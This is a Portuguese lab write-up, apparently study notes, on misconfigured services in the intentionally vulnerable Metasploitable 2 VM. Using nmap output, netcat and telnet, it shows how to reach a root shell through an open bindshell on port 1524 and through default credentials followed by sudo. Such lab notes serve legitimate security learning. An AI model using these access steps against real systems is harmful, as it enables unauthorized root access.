# Missconfiguration

Não é comum, mas o administrador pode deixar alguma 'brecha' aberta por falta de uma configuralção adequada.

Veja os exemplo do lab metasploit2

## Exemplo 1 - bindshell:

```
nmap -sV 192.168.1.33

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 13:42 -03
Nmap scan report for 192.168.1.33
Host is up (0.00021s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
...
1524/tcp open  bindshell   Metasploitable root shell
...
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C7:CF:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
 ```

Observamos que a porta 1524 está aberta para conexão de uma shell com user root. Se não houver autenticação para a conexão, teremos acesso a conta root e domínio sobre a máquina.

Usando um comando netcat simples:

```
─$ nc 192.168.1.33 1524                                                                          
root@metasploitable:/# 
```

Temos acesso a máquina metasploitable com o user root.

## Exemplo 2 - telnet:

```
$ nmap -sV 192.168.1.33

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 15:05 -03
Nmap scan report for 192.168.1.33
Host is up (0.00017s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
...
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C7:CF:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```
Ao tentar uma conexão via telnet...
```
$ telnet 192.168.1.33
                                                               
Trying 192.168.1.33...
Connected to 192.168.1.33.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: 
```
A tela de conexão telnet traz informações de login.
- Username: msfadmin
- Password: msfadmin

```
metasploitable login: msfadmin
Password: 
Last login: Wed Aug 20 20:37:46 EDT 2025 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:
```
Após logar, podemos escalar o privilégio.

```
msfadmin@metasploitable:~$ sudo su
[sudo] password for msfadmin:
```

A senha já conhecemos: msfadmin

```
root@metasploitable:/home/msfadmin# whoami
root
root@metasploitable:/home/msfadmin# cd /
root@metasploitable:/# ls
bin   cdrom  etc   initrd      lib         media  nohup.out  proc  sbin  sys  usr  vmlinuz
boot  dev    home  initrd.img  lost+found  mnt    opt        root  srv   tmp  var
root@metasploitable:/#
```
Mais uma vez acessamos a conta root da máquina metasploitable.

